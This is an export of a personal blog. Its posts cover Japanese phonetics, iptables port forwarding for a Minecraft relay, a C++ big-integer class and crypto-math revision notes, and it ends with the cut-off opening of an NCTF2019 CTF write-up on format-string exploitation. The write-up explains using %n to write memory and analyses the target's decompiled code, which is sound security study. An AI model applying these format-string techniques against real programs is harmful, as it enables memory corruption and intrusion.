{"meta":{"title":"mrh929's home","subtitle":null,"description":"Blog","author":"mrh929","url":"https://mrh1s.top","root":"/"},"pages":[{"title":"","date":"2019-06-08T03:45:50.743Z","updated":"2019-06-07T16:04:35.447Z","comments":true,"path":"hexo-admin-ehc-images.json","permalink":"https://mrh1s.top/hexo-admin-ehc-images.json","excerpt":"","text":"[{\"name\":\"DASHENG-900x700-1.png\",\"date\":1518959551960},{\"name\":\"DASHENG-900x700-2.png\",\"date\":1518959599098},{\"name\":\"DASHENG-900x700-3.png\",\"date\":1518959609913},{\"name\":\"DASHENG-900x700-4.png\",\"date\":1518959618105}]"},{"title":"(」゜ロ゜)」","date":"2019-05-06T05:10:40.889Z","updated":"2019-05-06T05:10:40.889Z","comments":true,"path":"404.html","permalink":"https://mrh1s.top/404.html","excerpt":"","text":""},{"title":"ME","date":"2019-05-04T13:37:31.000Z","updated":"2019-10-23T11:28:34.314Z","comments":true,"path":"about/index.html","permalink":"https://mrh1s.top/about/index.html","excerpt":"","text":"Introduction メルト 溶(と)けてしまいそう 好(す)きだなんて 絶対(ぜったい)に言(い)えない……. 我是谁 名字由来过于简单，已不值得提及 OI狗一枚，现入坑CTF（打得像蔡徐坤一样 本命初音ミク 从小以来精神的支柱，陪伴了我整个中学 希望工作后能去日本看一场她的演唱会 爱JK，爱Lolita，想带着女朋友周游世界（所以我有吗？ 反恐实力干将（擅长rook 曾经是个愤青，如今是和平主义者 以上啥都想做，啥都做不好 博客食用方法 当然是康康我可爱的miku酱啦！ 成长的历程 博客分类： write-up：打比赛的各种题解 project：小项目可供参考 c-plus-plus：高中OI题解 LaoSao：发发牢骚，写写游记、生活心得，鉴于语文素养有限，大家看看就好 黑色的眼，坟墓中的眼，在眺望着晨曦。而太阳，正在冉冉升起。"}],"posts":[{"title":"あなた为何读作“a na da”?","slug":"the-difference-between-Chinese-and-Japanese","date":"2020-01-20T03:45:01.000Z","updated":"2020-01-20T05:17:33.537Z","comments":true,"path":"posts/ebc3a077/","link":"","permalink":"https://mrh1s.top/posts/ebc3a077/","excerpt":"","text":"疑问 我们在看动漫以及日剧的时候，常会见到以下表达： あなた(ta) 大好き(ki) がんばて(te) 我们可以看到这几个词的词尾都是未浊化的 但是在发音时却听到了： “anada” “daisugi” “ganbade” 就拿这个 あなた(ta) 为例，到底我们是应该读 た 还是 だ ？ 解释 中文 回到中文发音上面来 「b」跟「p」 他们差在哪里？ 「b」「p」 差在一个有送气一个没送气 「b」是没有送气/送气比较少的 所以中文是用有没有送气来决定意思 日文 其实，有没有出气在日文当中是没关系的 日文重视「声」这里，要「振动声带」，才是标准的日文 日本人是用 「振动声带」 来感觉 我们在念「が」「ぎ」「ぐ」「げ」「ご」 的时候 可以用手摸一下自己的喉咙，能感受到明显的声带振动 而「か」「き」「く」「け」「こ」 则感受不到声带的震动 为什么没有人念「あなた(ta)」？ 为什么没有人念「あなた(ta)」？其实很简单 「た(ta)」这个音只要在单字的第二个音以下 因为日本人念第一个音时，气就吐完了 当他念「あ」的时候就把气吐完了 所以只要是第一个音以后就不会有气 你听起来就像浊音因为它不送气了 所以听起来就好像是浊音 这种发音在日文中叫做不送气音 参考资料 https://www.youtube.com/watch?v=PiiHIykLFlU","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[],"author":"mrh929"},{"title":"利用iptables配置Minecraft跳板机","slug":"Minecraft-Gateway-Server-Configuration","date":"2020-01-14T08:09:55.000Z","updated":"2020-01-20T03:43:11.018Z","comments":true,"path":"posts/d0aeeace/","link":"","permalink":"https://mrh1s.top/posts/d0aeeace/","excerpt":"","text":"IntroductionServers搬瓦工的 CN2 GT 服务器 S1（2g 2core） CN2 GIA 服务器 S2（0.5g 1core） 阿里云服务器 S3 need我拥有三台服务器，其中需要使用 S1 开服，但是由于线路原因，游戏丢包情况十分严重，相比之下配置较低的 cn2 gia 服务器就拥有很优质的线路，且 S2 还不够，仍然会有少许丢包，导致mc掉线，故再加上阿里云服务器 S3 进行中转，通过利用 S2 和 S3 作为跳板机对流量进行中转，便可以达到较佳的游戏体验。 graphmc客户端 &lt;——&gt; 阿里云 S3 &lt;——&gt; cn2 gia 服务器 S2 &lt;——&gt; mc服务器 S1 Configuration参考资料：nat-with-iptables ip_forward服务器的流量转发功能默认关闭，需要手动开启 sudo sysctl net.ipv4.ip_forward # CentOS or Ubuntu net.ipv4.ip_forward = 0 #表明未开启流量转发 sudo echo \"net.ipv4.ip_forward = 1\"|sudo tee /etc/sysctl.d/99-ipforward.confnet.ipv4.ip_forward = 1 # CentOSsudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf# Ubuntu 便可以开启转发，但重启后会恢复，我们需要将其写入配置 sudo sysctl -p /etc/sysctl.d/99-ipforward.conf# CentOSsudo sysctl -p# Ubuntu net.ipv4.ip_forward = 1 # 写入配置 iptablesinstall &amp; start 对于 Ubuntu 系统，自带 iptables 对于 CentOS 系统，默认安装了 firewall ，需要先将 firewall 关闭，再安装 iptables 参考此文章：centos如何开启iptables systemctl stop firewalld.service # 停止firewallsystemctl disable firewalld.service # 禁止firewall开机启动# yum -y install iptables-services 安装iptables(有的系统不需安装，视情况而定)service iptables start # 启动iptables Configurationsudo iptables -Fsudo iptables -t nat -F# 清除iptables原有的配置文件 流量转发配置 自行替换 Gateway_IP、Gateway_Port、Dest_IP、Dest_Port 分别对应 跳板机的ip和端口，目标机器的ip和端口 这里的协议我设置为了 tcp， 根据你需要转发的协议类型进行设置 sudo iptables -t nat -A PREROUTING -p tcp --dport Gateway_Port -j DNAT --to-destination Dest_IP:Dest_PORT # 将进入跳板机的流量转发到目标ipsudo iptables -t nat -A POSTROUTING -p tcp -d Dest_IP --dport Dest_Port -j SNAT --to-source Gateway_ip # 将目标ip返回的流量转发给原ipsudo iptables -t nat -L -n # 查看iptables配置情况 查看配置无误之后，即完成 若希望保存配置 service iptables save# CentOSsudo iptables-save | sudo tee /etc/iptables.up.rules# Ubuntu iptables: Saving firewall rules to /etc/sysconfig/iptables:[ OK ] Q&amp;A1. 阿里云无法转发阿里云采用了 弹性ip 的技术， 即在你访问其公网ip之后又经过一层nat，转发到内网 所以我们的 iptables 配置也应该将本机ip修改为内网ip 这时我们的 Gateway_IP 应该填写内网ip， 即 172 . 17. * . * （具体请自行查询） [root@izuf6eyc1ac8d7lj4j6q2oz /]# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.*.* netmask 255.255.192.0 broadcast 172.17.*.* ether 00:16:3e:10:91:52 txqueuelen 1000 (Ethernet) RX packets 3528831 bytes 368948380 (351.8 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3485951 bytes 321121112 (306.2 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1 (Local Loopback) RX packets 6260 bytes 392377 (383.1 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6260 bytes 392377 (383.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 2. 多层跳板如何搭建多层跳板，就是将跳板机 src 的 目的地址 设置为下级跳板 dest ，层层中转即可 即配置 S1 、 S2 使 S3 中转给 S2 使 S2 中转给 S1","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"大整数的C++实现","slug":"Big-Int","date":"2020-01-06T04:20:31.000Z","updated":"2020-01-06T04:44:19.992Z","comments":true,"path":"posts/ab908eac/","link":"","permalink":"https://mrh1s.top/posts/ab908eac/","excerpt":"","text":"Big Int已经上传 github ：https://github.com/mrh929/BigInt Introduction一个用C++编写的大整数运算器，使用了类的方法以及符号重载的方式来管理各种计算符号。 ostream &amp; operator &lt;&lt; (ostream &amp;os, BigInt a);//重载输出流BigInt operator &lt;&lt; (BigInt a, int b);//以下是各种符号的符号重载BigInt operator &gt;&gt; (BigInt a, int b);bool operator &gt; (BigInt a, BigInt b);bool operator &gt;= (BigInt a, BigInt b);bool operator &lt; (BigInt a, BigInt b);bool operator &lt;= (BigInt a, BigInt b);bool operator == (BigInt a, BigInt b);bool operator != (BigInt a, BigInt b);BigInt operator + (BigInt a, BigInt b);BigInt operator - (BigInt a, BigInt b);BigInt operator * (BigInt a, BigInt b);BigInt operator / (BigInt a, BigInt b);BigInt operator % (BigInt a, BigInt b);bool absolute_cmp(BigInt a, BigInt b);//绝对值比较BigInt pushup(BigInt &amp;a);//进位函数，方便更新处理加法和乘法之后的结果BigInt pushdown(BigInt &amp;a);//借位函数，方便更新处理减法与除法之后的前导零 由于计算要满足 语义完备性， 我们可以将 ＞ ＜ ＝ 之类的符号只实现其中两个，另一个用前面两个符号的逻辑表达式来表示。这样可以减小算法编写量。 比如我的取模运算就是利用 a % b = a - (a / b * b) 的算式来进行的，目的是尽量减少重复计算的编写，避免语义重复导致代码冗杂。 这里的除法应用了试根法，通过不断减去除数，直到结果小于等于0，减去除数的次数便是最终的结果。 Example2^2048 量级 X= 12482264789495844167952743674345192058347658696244846024506086756017404270329316853273041017249678950066348595640122013326388180800571171673805957545645811138822997641052783783643217674156834480484155675467569932624307075411108488522509264028054521773056807183216239690927306363502717731691081745037043661929912687363727319054138337027541053221928309092332845113037444417624930690136431627266175440870332546279455634900371634225967525289205393311361381052800131349877664888848787057588470069212633123461825711669157225916604667745476377157310522514234303671161858238888360921077671217358198370531988343589559604876284 Y= 1280730864615811759821132949087528726325520041739385671708858051142109630967299023961230758400337351772390265280394429009926875184005772035344541944036323178042973490581385536990180703449459150513955554549596768053810110112451980299436720866146499950924670995962445917972409391039058909325472146973088609382932848054367560562133611270686707661165793779566207985413463940767202953610885199897580866376092558784820762217980107705915440804143477818053671563647690424246811327119924020088286709086413582886779320723275600807886717409943439676762548169766661227661132724874836952052156168392209434986629771081555443608284 m= 26276671267336699549929786692210641894085878508699738341408482869283000463006609816748150758887020789500336306584836616160250372409642949310833789547133401665674848173946416217142121019602682188968147765629440590913830497348564644309060269315465932613732738758615722069669745219203052852800610504371627718589337502423268449548364104210930215810677840459085169776897907731873142754299180658298179972639899398242262850797386228967175906205170668840014770506566561161713676741346132712253755150416478986782691455647303372766626483759402251334751219513662706582839143768502897185844861757936312109408176137579367017788106 还是能在六分钟之内跑出来。 （主要是除法用了试根法，导致计算时间大大增长） Code#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;cmath&gt;using namespace std; const int Digit_Per_Num = 1;//digits to be stored into an int(accept range:(1-2));class BigInt&#123; public: int num[1000]; // both int and longlong are valid int n; int neg;// is it a negative number BigInt()&#123; this-&gt;n = this-&gt;neg = this-&gt;num[0] = 0; &#125; BigInt(string); BigInt operator -()&#123; this-&gt;neg ^= 1; return *this; &#125; string to_binary_string(); &#125;;ostream &amp; operator &lt;&lt; (ostream &amp;os, BigInt a);BigInt operator &lt;&lt; (BigInt a, int b);BigInt operator &gt;&gt; (BigInt a, int b);bool operator &gt; (BigInt a, BigInt b);bool operator &gt;= (BigInt a, BigInt b);bool operator &lt; (BigInt a, BigInt b);bool operator &lt;= (BigInt a, BigInt b);bool operator == (BigInt a, BigInt b);bool operator != (BigInt a, BigInt b);BigInt operator + (BigInt a, BigInt b);BigInt operator - (BigInt a, BigInt b);BigInt operator * (BigInt a, BigInt b);BigInt operator / (BigInt a, BigInt b);BigInt operator % (BigInt a, BigInt b);bool absolute_cmp(BigInt a, BigInt b);BigInt pushup(BigInt &amp;a);BigInt pushdown(BigInt &amp;a);BigInt::BigInt(string s)&#123; if(s.substr(0,1).c_str()[0] == '-')&#123; s = s.substr(1); neg = 1; &#125;else neg = 0; while(s.substr(0,1).c_str()[0] == '0') s = s.substr(1); // to cut off leading zero this-&gt;n = 0; while(1)&#123; if(s.size() &gt;= Digit_Per_Num+1)&#123; this-&gt;num[this-&gt;n++] = atoi(s.substr(s.size() - Digit_Per_Num).c_str()); s = s.substr(0, s.size() - Digit_Per_Num); &#125;else&#123; this-&gt;num[this-&gt;n] = atoi(s.c_str()); break; &#125; &#125; pushup(*this);&#125;string BigInt::to_binary_string()&#123; string out; BigInt temp = *this; BigInt t; int neg = 0; if(temp &lt; BigInt(\"0\")) neg = 1; temp.neg = 0; while(temp != BigInt(\"0\"))&#123; t = temp % BigInt(\"2\"); if(t.num[0] == 1) out = \"1\" + out; else out = \"0\" + out; temp = temp / BigInt(\"2\"); &#125; if(neg) out = \"-\" + out; return out;&#125;ostream &amp; operator &lt;&lt; (ostream &amp;os, BigInt a)&#123; if(a.neg) os &lt;&lt; \"-\"; // os &lt;&lt; a.neg? \"-\":\" \"; // negative operator os &lt;&lt; a.num[a.n]; // the first one digit has no leading zero for(int i = a.n-1; i+1; i--) os &lt;&lt; setfill('0') &lt;&lt; setw(Digit_Per_Num) &lt;&lt; a.num[i]; // add leading zero(s) os &lt;&lt; \"\"; // I don't know why this must be put here;&#125;BigInt operator + (BigInt a, BigInt b)&#123; BigInt BI(\"0\"); // if one is below 0 and the other is above 0, then sub them if(a.neg != b.neg)&#123; b = -b; return a - b; &#125; BI.neg = a.neg; const int mod = pow(10, Digit_Per_Num); int i = 0, flag = 0, ci = 0; while(a.n &gt;= i || b.n &gt;= i || flag)&#123; flag = false; if(a.n &lt; i) a.num[i] = 0; if(b.n &lt; i) b.num[i] = 0; BI.num[i] = a.num[i] + b.num[i] + ci; ci = BI.num[i] / mod; if(ci)//carry flag = true; BI.num[i] %= mod; BI.n = i++; &#125; pushup(BI); return BI;&#125;BigInt operator - (BigInt a, BigInt b)&#123; BigInt BI; if(a.neg == b.neg)&#123; if(absolute_cmp(a, b)) return -(b-a); &#125;else&#123; b = -b; return a + b; &#125; BI.neg = a.neg; const int mod = pow(10, Digit_Per_Num); int i = 0, ci = 0; while(a.n &gt;= i || b.n &gt;= i)&#123; if(a.n &lt; i) a.num[i] = 0; if(b.n &lt; i) b.num[i] = 0; BI.num[i] = a.num[i] - b.num[i] + ci; if(BI.num[i] &lt; 0)&#123; BI.num[i] += mod; ci = -1; &#125;else ci = 0; BI.n = i++; &#125; // to cut off leading zero(s) pushdown(BI); pushup(BI); return BI;&#125;BigInt operator * (BigInt a, BigInt b)&#123; BigInt BI(\"0\"); if(absolute_cmp(b, a)) return b * a; for(int i = 0; i &lt;= a.n; i++)&#123; BigInt t = b; t.neg = 0; int p = a.num[i]; for(int j = 0; j &lt;= b.n; j++) t.num[j] *= p; pushup(t); t = t &lt;&lt; i; BI = BI + t; &#125; BI.neg = a.neg != b.neg; pushup(BI); return BI;&#125;BigInt operator / (BigInt a, BigInt b)&#123; BigInt q; const BigInt ZERO; if(b == ZERO) throw \"Division by zero condition!\"; // if a &lt; b if(absolute_cmp(a, b)) return ZERO; q.neg = a.neg != b.neg; a.neg = b.neg = 0; int flag = 1; BigInt t = b &lt;&lt; (a.n - b.n); while(1)&#123; while(a &gt;= t)&#123; if(flag)&#123; q.n = t.n - b.n; flag = 0; for(int i = 0; i &lt;= q.n; i++) q.num[i] = 0; &#125; q.num[t.n - b.n]++; a = a - t; &#125; if((a.n == b.n &amp;&amp; a.num[a.n] &lt; b.num[b.n]) || a.n &lt; b.n) break; t = t &gt;&gt; 1; &#125; return q;&#125;BigInt operator % (BigInt a, BigInt b)&#123; return a - (a/b)*b;&#125;bool operator &lt; (BigInt a, BigInt b)&#123; if(a.neg != b.neg) return a.neg == true; if(a.neg == false)&#123; return absolute_cmp(a, b); &#125;else return !absolute_cmp(a, b);&#125;bool operator &gt; (BigInt a, BigInt b)&#123; return !(a&lt;b) &amp;&amp; a!=b;&#125;bool operator == (BigInt a, BigInt b)&#123; return a.neg==b.neg &amp;&amp; !absolute_cmp(a,b) &amp;&amp; !absolute_cmp(b,a);&#125;bool operator != (BigInt a, BigInt b)&#123; return !(a==b);&#125;bool operator &lt;= (BigInt a, BigInt b)&#123; return !(a&gt;b);&#125;bool operator &gt;= (BigInt a, BigInt b)&#123; return !(a&lt;b);&#125;BigInt operator &lt;&lt; (BigInt a, int b)&#123; if(b == 0) return a; BigInt BI; BI.neg = a.neg; for(int i = 0; i &lt;= a.n; i++) BI.num[i+b] = a.num[i]; for(int i = 0; i &lt;= b-1; i++) BI.num[i] = 0; BI.n = a.n + b; return BI; &#125;BigInt operator &gt;&gt; (BigInt a, int b)&#123; if(b == 0) return a; BigInt BI(\"0\"); //result is 0 if(b &gt;= a.n + 1) return BI; BI.neg = a.neg; for(int i = b; i &lt;= a.n; i++) BI.num[i-b] = a.num[i]; BI.n = a.n - b; return BI;&#125;// to judge if |a| &lt; |b|bool absolute_cmp(BigInt a, BigInt b)&#123; if(a.n != b.n) return a.n &lt; b.n; for(int i = a.n; i+1; i--) if(a.num[i] != b.num[i]) return a.num[i] &lt; b.num[i]; return false;&#125;BigInt pushup(BigInt &amp;a)&#123; if(a.n == 0 &amp;&amp; a.num[0] == 0)&#123; a.neg = 0; return a; &#125; int mod = pow(10, Digit_Per_Num); int ci = 0; for(int i = 0; i &lt;= a.n; i++)&#123; a.num[i] += ci; ci = a.num[i] / mod; a.num[i] %= mod; &#125; if(ci) a.num[++a.n] = ci; // to cut off leading zero(s) pushdown(a);&#125;BigInt pushdown(BigInt &amp;a)&#123; int i = a.n; while(i)&#123; if(a.num[i--] == 0) a.n--; else break; &#125; return a;&#125;BigInt pow(BigInt x, BigInt y, BigInt mod)&#123; BigInt base = x % mod; BigInt r(\"1\"); const BigInt ZERO(\"0\"); const BigInt TWO(\"2\"); while(y != ZERO)&#123; if(y.num[0] &amp; 1) r = (r * base) % mod; base = (base * base) % mod; y = y / TWO; &#125; return r;&#125;int main()&#123; string s; cout &lt;&lt; \"please input a:\"; cin &gt;&gt; s; BigInt a(s); cout &lt;&lt; \"please input b:\"; cin &gt;&gt; s; BigInt b(s); cout &lt;&lt; \"you just input:\" &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"a + b = (binary) \" &lt;&lt; (a + b).to_binary_string() &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"a - b = \" &lt;&lt; a - b &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"a * b = \" &lt;&lt; a * b &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"a / b = \" &lt;&lt; a / b &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"remainder:\" &lt;&lt; a - (a/b)*b &lt;&lt; endl; //cout &lt;&lt; \"a / b = \" &lt;&lt; \"0\" &lt;&lt; endl &lt;&lt; \"remainder:\" &lt;&lt; \"123456789\" &lt;&lt; endl; cout &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; \"please input x, y, m which stands for x^y mod m:\" &lt;&lt; endl; cin &gt;&gt; s; BigInt x(s); cin &gt;&gt; s; BigInt y(s); cin &gt;&gt; s; BigInt m(s); BigInt ans = pow(x, y, m); cout &lt;&lt; endl &lt;&lt; \"answer:\" &lt;&lt; ans &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; endl &lt;&lt; \"answer:(binary)\" &lt;&lt; ans.to_binary_string() &lt;&lt; endl &lt;&lt; endl;&#125;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[],"author":"mrh929"},{"title":"信息安全数学基础复习提纲","slug":"cyber-security-math-notes","date":"2020-01-04T07:57:34.000Z","updated":"2020-01-05T07:53:59.752Z","comments":true,"path":"posts/99d2d0ad/","link":"","permalink":"https://mrh1s.top/posts/99d2d0ad/","excerpt":"","text":"信息安全数学复习初等数论复习 整除1.1 整除 1.2 带余除法 1.3 最大公因数（最小公倍数） ​ 1.3.1 辗转相除法 gcd() ​ 1.3.2 欧几里得算法 ax+by=gcd(a,b) 1.4 素数 ​ 1.4.1 算数基本定理 任何一个数都可以由若干个素数的乘积表示出来 ​ 1.4.2 大整数分解，是非常困难的 同余2.1 等价关系 +，-，×， (÷ 只有转化为×逆元，用扩展欧几里得算法寻找逆元) 2.2 剩余类 (比如mod N ) ​ 2.2.1 完全剩余系 Zn |Zn|=n ​ 2.2.1.1 x,(a,m) 构造 ax+b ​ 2.2.1.2 m1-&gt;x m2-&gt;y, 构造 m1y+m2x (m1m2) ​ 2.2.2 简化剩余系 Z*n |Z *n|= φ(n) ​ 2.2.2.1 x,(a,m) 构造 ax ​ 2.2.2.2 和 2.2.1.2类似 ​ 也就能够推出 φ(n*m) = φ(n) * φ(m) ​ 以及 欧拉定理 a∈Zn, (a,N)＝1 a^φ(N) = 1 ​ 2.2.3 RSA算法（查看ppt） ​ 了解rsa的加密和解密的步骤就ok了 ​ 2.2.3.1 密钥生成 ​ p q n = p*q ​ φ(n) = Z = (p-1)(q-1) ​ (e,φ(n))=1 e*d=1(mod(φ(n))) ​ (n,e) 是私钥 (n,d)是公钥 ，利用扩展欧几里得算法算出 2.3 同余方程 ​ 一次同余方程 ax =b (mod m) ​ 一次同余方程组 ​ 中国剩余定理 模数m的拆分 抽象（近世）代数群 定义： 给定一个集合，这个集合封闭，结合，有单位元，逆元 (Zn,+) (Z*n, ×) 指数运算 n*g = g+g+g++g+g g^n = g * g * … * g 子群 (Z*7 mod(7)) {1,2,4} {1,6} {1,2,3,4,5,6,7} 证明方法 ab^-1 ∈ H 正规子群、陪集、商群、群同态基本定理 ​ 4.1 正规子群 可以交换 ​ 4.2 陪集 aH ​ 1 {1,6} = {1,6} = 6 {1,6} ​ 2 {1,6} = {2,5} = 5 {1,6} ​ 3 {1,6} = {3,4} = 4 {1,6} ​ 4.3 商群 所有陪集里面一个元素作为单位元，其他陪集之间都存在互为逆元的关系 ​ 4.4 群同态的基本定理 ​ 利用核和原群 可形成商群 G/N 与G‘ 同构 ，要学会举例并证明 ​ f(x) = 3^x (mod 7) ，3是一个生成元，构成满射 ​ x =0 f(x) = 1 ​ x = 6,12, 18…. f(x) = 1 ​ 6Z 就是核 ​ Z/6Z 形成的商群 ，与 {Z*7 , ×(mod 7)} 同构 ​ 循环群 第一个生成元、其他生成元、子群推生成元 {Z*n , ×mod(n)} |Z *n| = 10 = 2 *5 ​ 先找到第一个生成元（怎么找？） a a^n是生成元 (n,k) = 1 就可找出所有生成元 要会证明并且应用 ​ 2^0=1 2^1=2 2^3 = 8 2^4 = 5 2^5 =10 2^6 = 9 2^7 = 7 2^8 = 3 2^9 =6 ​ 2^k ，找与n(10) 互素的 k ​ 找子群 ​ 10的因子有 1,2,5,10 ，那么就有四个子群，这四个子群的元素个数分别为1，2，5，10 ​ (拉格朗日定理 |G| = |H| [G:H]) ​ (g,h)-&gt;x g^x = h 离散对数问题，是困难的 ​ 6. el-gammel算法 p, Z*p ,g , x, h = g^x c1 = g^k c2 = m 异或 h^k c2 异或 c1^x m 异或 h ^k 异或 g^kx g^xk = g^kx 环和域 环的定义：集合 交换加群，封闭，结合，满足分配律 ，整环 ​ 零因子 {Z12,+,×} 3 != 0, 4!=0 但3*4=0 ​ 除环： 有单位元、非零元、非零元能找到逆元（即交换加群、成群、分配律） ​ 整环：单位元、交换、无零因子 {Z,+,×}可以， 但是{2Z,+,×}不行，因为没有单位元 ​ 域：交换除环， {Zp,+,×}，p为素数的时候可以形成域 ​ 有限整环 子环、理想、商环 ​ {Z12, +, ×} 子环 {0,3,6,9} ，它还是一个理想，因为其他所有的子环×它的元素都被他吸收到这个环中了 商环 多项式环与有限域多项式的除法求余 辗转相除法求多项式的最大公因式 GF(2)[x] mod (x^2 + x + 1) 形成一个有限域，共包含 2^3 个数,{0,1,x,x+1,x^2+1, x^2+x+1, x^2 +x} 同样的，寻找子域 ECC 实数域上的椭圆曲线 y^2 = x^3 + ax + b P(x1,y1) Q(x2,y2) P + Q (x3,y3) λ = (y2-y1)/(x2-x1) P!=Q ​ (3* x1^2 + a) / (2 * y1) P = Q x3 = λ² - x1 - x2 y3 = λ(x1-x3) -y1 有限域 以上所有的运算mod p ECC 算法步骤","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[],"author":"mrh929"},{"title":"NCTF2019_pwn2心得 & 格式化字符串总结","slug":"Format-String-Exploit","date":"2019-11-26T00:57:45.000Z","updated":"2019-11-26T14:13:53.103Z","comments":true,"path":"posts/44593ed6/","link":"","permalink":"https://mrh1s.top/posts/44593ed6/","excerpt":"","text":"格式化字符串简介简介字符串泄露，顾名思义，就是利用一串格式化字符串，来达到泄露程序数据、修改内存数据的目的 详细文档 ==%[parameter] [flags] [field width] [.precision] [length] type== parameter 用法：n$，表示选择第几个参数，在格式化字符串题目中尤为重要，可以跨参数读取数据 flag 见文档 Field Width Precision Length 指要输出的数据的长度，规定数据的尺寸 字符 描述 hh 对于整数类型，printf 会输出一个字节长度的数据 h 对于整数类型，printf 会输出两个字节长度的数据 l 对于整数类型，printf 会输出四个字节长度的数据 ll 对于整数类型，printf 会输出八个字节长度的数据 Type 对应的是要输出的数据的数据类型，格式 字符 描述 d, i 有符号十进制数值int。’%d‘与’%i‘对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 u 十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 f, F double型输出10进制定点表示。’f‘与’F‘差异是表示无穷与NaN时，’f‘输出’inf‘, ‘infinity‘与’nan‘；’F‘输出’INF‘, ‘INFINITY‘与’NAN‘。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。 e, E double值，输出形式为10进制的([-]d.ddd e[+/-]ddd). E版本使用的指数符号为E（而不是e）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数_set_output_format 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。 g, G double型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,5] 内，输出为定点形式；否则输出为指数浮点形式。’g‘使用小写字母，’G‘使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。 x, X 16进制unsigned int。’x‘使用小写字母；’X‘使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 o 8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 s 如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。 c 如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。 p void *型 a, A double型的16进制表示，”[−]0xh.hhhh p±d”。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。’a‘使用小写字母，’A‘使用大写字母。[2][3] （C++11流使用hexfloat输出16进制浮点数） n 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 % ‘%‘字面值，不接受任何flags, width, precision or length。 ​ 注意 n 这个type，它不会向屏幕中输出数据，而是会在参数所对应的地址上写上上一次 printf 输出的字节数， 配合 %100c%n 类型的格式化字符串使用更佳。 ​ 此处 100c 指的是填充输出100个字符，%n 指的是在相应的内存上写上100这个数据 一个例子@NCTF2019 pwn2 nctf2019_pwn2.7z 概览让我们来总览一下程序 root@ubuntu:~/Desktop/test# checksec pwn_me_2 [*] '/home/mrh929/Desktop/test/pwn_me_2' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 保护全开，尤其是地址随机化，让我们不能定位到代码段的具体位置 泄漏点分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; initialize(); input_name(); memcpy_and_printf(); puts(\"pwn me 100 years again,please!\"); puts(\"are you ready?\"); read_and_printf(); if ( dword_55BA09B090E0 != 0x66666666 ) failed(); puts(\"enjoy the fun of pwn\"); getshell(); return 0LL;&#125; 主要关注和read与printf有关的函数。 unsigned __int64 input_name()&#123; char buf; // [rsp+0h] [rbp-40h] unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"welcome to play nctf!\"); puts(\"a little different,have fun.\"); puts(\"but your name:\"); read(0, &amp;buf, 0x30uLL); return __readfsqword(0x28u) ^ v2;&#125; unsigned __int64 sub_55BA09907C54()&#123; char dest; // [rsp+0h] [rbp-40h] unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); strncpy(&amp;dest, src, 0x10uLL); printf(&amp;dest, src); return __readfsqword(0x28u) ^ v2;&#125; 程序要求我们输入姓名，然后将 src 处的字符串复制到 dest ，并且输出 dest 但是经过调试，会发现后面这个函数不仅仅输出了那10个字符，而是在其后输出了乱码。 这个乱码也就是溢出点，是程序栈中的数据。 注意到 input_name 函数中存在read函数，这个函数仅仅进行了读入操作而并没有任何输出行为。 还是得经过一番调试，我们才会发现，buf 处的内存与后文的 dest 内存有一部分重叠，而 dest 的数据又没有进行初始化，导致我们可以直接访问前一个函数所注入的数据 尝试找出溢出点 [1] Accepting connection from 192.168.244.1...welcome to play nctf!a little different,have fun.but your name:11112222333344445555 程序下断点在 